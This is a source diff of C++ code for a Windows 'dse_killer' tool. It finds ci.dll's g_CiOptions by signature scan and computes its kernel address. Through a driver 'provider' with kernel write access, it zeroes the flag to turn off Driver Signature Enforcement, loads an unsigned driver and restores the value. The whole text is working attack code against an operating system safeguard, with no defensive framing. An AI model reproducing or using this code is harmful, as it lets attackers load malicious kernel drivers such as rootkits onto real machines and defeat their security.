@@ -2,19 +2,22 @@
 
 void dse_killer::load_unsigned_driver(provider* provider, path driverPath)
 {
-	uintptr_t g_CiOptions_Offset = get_g_CiOptions_Offset();
-	Log("The offset g_CiOptions is relative ImageBase for CI.dll 0x%llX", g_CiOptions_Offset);
+	uintptr_t pgCiOptionsRva = get_g_cioptions_rva();
+	Log("g_CiOptions RVA = 0x%llX", pgCiOptionsRva);
 
-	uintptr_t imageBaseCiInKernel = get_ci_image_base_in_kernel();
-	Log("The kernel image base CI.dll 0x%016llX", imageBaseCiInKernel);
+	uintptr_t kernelCiImageBaseVa = get_ci_image_base_in_kernel();
+	Log("The kernel image base VA CI.dll 0x%016llX", kernelCiImageBaseVa);
 
-	uintptr_t pg_CiOptions_kernel = imageBaseCiInKernel + g_CiOptions_Offset;
+	uintptr_t pgCiOptionsKernelVa = kernelCiImageBaseVa + pgCiOptionsRva;
+	Log("g_CiOptions kernel VA 0x%016llX", pgCiOptionsKernelVa);
 
 	provider->init();
-	DWORD oldValue{ 0 };
-	provider->write_kernel_memory(pg_CiOptions_kernel, 0x0, 1, &oldValue);
+	char oldValue = 0, newValue = 0;
+	provider->write_kernel_virtualmemory(pgCiOptionsKernelVa, &newValue, sizeof(newValue), &oldValue);
+	LogSuccess("Successfully set value 0x%X -> 0x%X for 0x%016llX(ci.dll!g_CiOptions)", oldValue, newValue, pgCiOptionsKernelVa);
 	load_driver(driverPath);
-	provider->read_kernel_memory(pg_CiOptions_kernel, &oldValue, 1);
+	provider->write_kernel_virtualmemory(pgCiOptionsKernelVa, &oldValue, sizeof(oldValue));
+	LogSuccess("Successfully set value 0x%X -> 0x%X for 0x%016llX(ci.dll!g_CiOptions)", newValue, oldValue, pgCiOptionsKernelVa);
 	provider->release();
 	unload_driver(driverPath);
 }
@@ -45,21 +48,16 @@ uintptr_t dse_killer::get_ci_image_base_in_kernel()
 	return 0;
 }
 
-// Get the offset g_CiOptions is relative ImageBase for CI.dll
-uintptr_t dse_killer::get_g_CiOptions_Offset()
+// Get RVA g_CiOptions in ring3
+uintptr_t dse_killer::get_g_cioptions_rva()
 {
-	uintptr_t pCiMap = map_ci_into_memory();
-	uintptr_t pCiAuditImageForHvci = scanner::sig_scan_section("PAGE", (PIMAGE_DOS_HEADER)pCiMap, SIG_CI_OPTIONS, sizeof(SIG_CI_OPTIONS));
-
-	if (!pCiAuditImageForHvci)
-		LogError("g_CiOptions could not be found in mapped CI.dll!");
-
-	DebugLog(".PAGE:CiAuditImageForHvci + 0x146 == 0x%016llX", pCiAuditImageForHvci);
-
-	signed int offsetCiOptions = *(PDWORD)(pCiAuditImageForHvci + 2);
-	uintptr_t absoluteCiOptions = offsetCiOptions + pCiAuditImageForHvci + 10;
-
-	return absoluteCiOptions - pCiMap;
+	uintptr_t pCiImageBaseVA = map_ci_into_memory();
+	uintptr_t pMovCiOptionsToEax = scanner::sig_scan_section("PAGE", (PIMAGE_DOS_HEADER)pCiImageBaseVA, SIG_CI_OPTIONS, sizeof(SIG_CI_OPTIONS));
+	if (!pMovCiOptionsToEax)
+		LogError("dse_killer::get_g_cioptions_rva sig_scan_section error!");
+	DebugLog("VA(ring3) = 0x%016llX (mov eax, g_CiOptions)", pMovCiOptionsToEax);
+	uintptr_t va = pMovCiOptionsToEax + 6 + *(__int32*)(pMovCiOptionsToEax + 2);
+	return va - pCiImageBaseVA;
 }
 
 uintptr_t dse_killer::map_ci_into_memory()
